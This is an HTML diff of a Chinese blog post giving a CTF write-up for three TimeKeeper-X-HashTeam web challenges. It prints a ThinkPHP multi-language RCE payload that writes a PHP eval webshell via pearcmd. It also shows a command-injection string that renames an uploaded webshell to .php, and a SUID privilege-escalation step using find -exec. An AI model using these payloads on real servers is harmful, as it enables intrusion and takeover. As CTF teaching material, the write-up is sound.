@@ -12,7 +12,7 @@
 
 
 
-<title>Archives: 2023 | Stuuupid&#39;s Blog</title>
+<title>2023TimeKeeper-X-HashTeam | Stuuupid&#39;s Blog</title>
 
 
 
@@ -408,96 +408,222 @@
     }
 </script>
         <div class="main">
-            <div class="post-wrap archive">
+            <div class="container">
     
     
-    
-        
-        
-        
-        
-                
-                
-                    <h3>2023</h3>
-                
-                <article class="archive-item">
-                    <a class="archive-item-link" href="/2023/04/09/2023TimeKeeper-X-HashTeam/">2023TimeKeeper-X-HashTeam</a>
-                    <span class="archive-item-date">April 9, 2023</span>
-                </article>
-        
-                
-                
-                <article class="archive-item">
-                    <a class="archive-item-link" href="/2023/01/28/%E9%9B%86%E8%AE%ADWriteUp-4/">集训WriteUp-4</a>
-                    <span class="archive-item-date">January 28, 2023</span>
-                </article>
-        
-                
-                
-                <article class="archive-item">
-                    <a class="archive-item-link" href="/2023/01/15/%E9%9B%86%E8%AE%ADWriteUp-3/">集训WriteUp-3</a>
-                    <span class="archive-item-date">January 15, 2023</span>
-                </article>
-        
-                
-                
-                <article class="archive-item">
-                    <a class="archive-item-link" href="/2023/01/13/%E9%9B%86%E8%AE%ADWriteUp-2/">集训WriteUp-2</a>
-                    <span class="archive-item-date">January 13, 2023</span>
-                </article>
-        
-                
-                
-                <article class="archive-item">
-                    <a class="archive-item-link" href="/2023/01/04/%E9%9B%86%E8%AE%ADWriteUp-1/">集训WriteUp-1</a>
-                    <span class="archive-item-date">January 4, 2023</span>
-                </article>
-        
-                
-                
-                    <h3>2022</h3>
-                
-                <article class="archive-item">
-                    <a class="archive-item-link" href="/2022/12/27/2022Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-web-%E9%83%A8%E5%88%86/">2022Dest0g3-520迎新赛-web(部分)</a>
-                    <span class="archive-item-date">December 27, 2022</span>
-                </article>
-        
-                
-                
-                <article class="archive-item">
-                    <a class="archive-item-link" href="/2022/12/24/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/">XSS跨站脚本攻击</a>
-                    <span class="archive-item-date">December 24, 2022</span>
-                </article>
-        
-                
-                
-                <article class="archive-item">
-                    <a class="archive-item-link" href="/2022/12/15/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a>
-                    <span class="archive-item-date">December 15, 2022</span>
-                </article>
-        
-                
-                
-                <article class="archive-item">
-                    <a class="archive-item-link" href="/2022/12/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/">数据库基础</a>
-                    <span class="archive-item-date">December 13, 2022</span>
-                </article>
-        
-                
-                
-                <article class="archive-item">
-                    <a class="archive-item-link" href="/2022/12/12/web%E5%9F%BA%E7%A1%80%E5%92%8C%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/">web基础和靶场搭建</a>
-                    <span class="archive-item-date">December 12, 2022</span>
-                </article>
-        
-        
-        <nav class="pagination">
-            <span class="page-number current">1</span><a class="page-number" href="/archives/2023/page/2/">2</a>
-        </nav>
-        
-    
-  
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
 </div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">2023TimeKeeper-X-HashTeam</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Ex1Le23</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">April 9, 2023&nbsp;&nbsp;19:38:36</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Wp-web/">Wp-web</a>
+                            
+                        </span>
+                    
+                    
+                        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<span class="site-pv">
+    总访问量:
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p><a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/home/index">题目地址</a></p>
+<h1 id="Web签到-连连看"><a href="#Web签到-连连看" class="headerlink" title="Web签到-连连看"></a>Web签到-连连看</h1><p>在前端中找到疑似flag的字符串：</p>
+<img src="/2023/04/09/2023TimeKeeper-X-HashTeam/flag1.png" class="" title="flag1">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;\x54\x4b\x48\x41\x53\x48\x7b\x57\x65\x31\x63\x34\x6d\x33\x5f\x54\x30\x5f\x54\x4b\x2a\x48\x41\x53\x48\x5f\x43\x54\x46\x5f\x33\x6e\x6a\x30\x79\x5f\x31\x74\x7d&quot;</span><br></pre></td></tr></table></figure>
+
+<p>输出即拿到FLAG：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TKHASH&#123;We1c4m3_T0_TK*HASH_CTF_3nj0y_1t&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="think"><a href="#think" class="headerlink" title="think"></a>think</h1><p>题目给出提示“thinkphp是很好的php开发框架，小猪猪尤其喜欢它的多语言功能”。放搜索引擎容易查到ThinkPHP 多语言模块RCE漏洞。攻击者可以通过 get、header、cookie 等位置传入参数，实现目录穿越+文件包含，通过 pearcmd 文件包含这个 trick 即可实现 RCE。</p>
+<p>给出exp如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?lang=../../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/&lt;?=@eval($_POST[&#x27;new&#x27;]);?&gt;+/var/www/html/new.php</span><br></pre></td></tr></table></figure>
+
+<p>值得注意的是，如果直接传入lang会导致<code>&lt;</code>,<code>&#39;</code>,<code>&gt;</code>被编码，从而无法被解析，如下图：</p>
+<img src="/2023/04/09/2023TimeKeeper-X-HashTeam/flag20.png" class="" title="flag2_0">
+
+
+<p>因此需要借助BurpSuite抓包，对请求包做一下修改。之后成功上传，且路径给出，即可用蚁剑连接，拿到flag.</p>
+<img src="/2023/04/09/2023TimeKeeper-X-HashTeam/flag21.png" class="" title="flag2_1">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TKHASH&#123;ggb0nd_l1k3s_e4t1ng_loll1p0p&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>资料：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41904294/article/details/128437188">ThinkPHP 多语言模块RCE漏洞复现</a></p>
+</blockquote>
+<h1 id="new-friends"><a href="#new-friends" class="headerlink" title="new friends"></a>new friends</h1><p>一道文件上传题目，只能上传<code>.png</code>后缀的文件，且前后端都有过滤，无法直接对后缀修改或上传<code>.htaccess</code>配置文件修改文件解析方式。</p>
+<p>这里先把先将一句话木马改成<code>.png</code>后缀，成功上传<code>webshell.png</code>。并且告诉我们上传文件夹在<code>/uploads</code>。</p>
+<p>接下来试着对<code>ping</code>功能下手。我们知道<code>ping</code>主机在服务器上的实现如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 0.0.0.0</span><br></pre></td></tr></table></figure>
+
+<p>如果是（借助<code>;</code>分隔两条命令）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 0.0.0.0;ls</span><br></pre></td></tr></table></figure>
+
+<p>就可以实现<code>ping</code>和<code>ls</code>两条命令的先后执行。这里进行尝试，结果如下：</p>
+<img src="/2023/04/09/2023TimeKeeper-X-HashTeam/flag30.png" class="" title="flag3_0">
+
+<p>可以看到，<code>ls</code>命令成功执行，并且找到了我们uploads文件夹，下一步只需借助<code>mv</code>命令对<code>webshell.png</code>重命名即可，payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0;cd uploads;mv webshell.png webshell.php</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/04/09/2023TimeKeeper-X-HashTeam/flag31.png" class="" title="flag3_1">
+<p><code>webshell.png</code>重命名成功，下一步用蚁剑连接，寻找到flag，但是因为权限不够，无法打开该文件，需要提权。</p>
+<p>Linux下SUID提权方法：SUID可以让调用者以文件拥有者的身份运行该文件，所以我们利用SUID提权的思路就是运行root用户所拥有的SUID的文件，那么我们运行该文件的时候就得获得root用户的身份了。已知的可用来提权的linux可行性的文件列表如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nmap</span><br><span class="line">vim</span><br><span class="line">find</span><br><span class="line">bash</span><br><span class="line">more</span><br><span class="line">less</span><br><span class="line">nano</span><br><span class="line">cp</span><br></pre></td></tr></table></figure>
+
+<p>此时，我们首先用如下命令查看具有root用户权限的SUID文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>发现find文件恰好是以suid权限运行，继续查看find的信息，确实是root权限的suid文件(含s)</p>
+<img src="/2023/04/09/2023TimeKeeper-X-HashTeam/flag32.png" class="" title="flag3_2">
+
+<p>于是通过find执行的所有命令都会以root权限执行。</p>
+<p>接下来我们用find进行权限提升，执行如下命令，将会显示root</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/find 系统中任意存在的文件名 -exec 命令 \;      //注: \;是-exec选项的参数</span><br></pre></td></tr></table></figure>
+
+<p>然后读取flag即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/find flag -exec cat flag \;</span><br></pre></td></tr></table></figure>
+
+<p>拿到flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TKHASH&#123;h1ll0_m1_new_fr1ends&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>资料：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Fly_hps/article/details/80428173">Linux提权:利用SUID提权</a></p>
+</blockquote>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        <a href="/tags/web/"># web</a>
+                    
+                        
+                </span>
+            </div>
+            <div class="reward" >
+                
+                    
+
+                
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2023/01/28/%E9%9B%86%E8%AE%ADWriteUp-4/">集训WriteUp-4</a>
+            
+        </section>
+
+        
+
+    </article>
+</div>
+
         </div>
         <footer id="footer" class="footer">
     <div class="copyright">
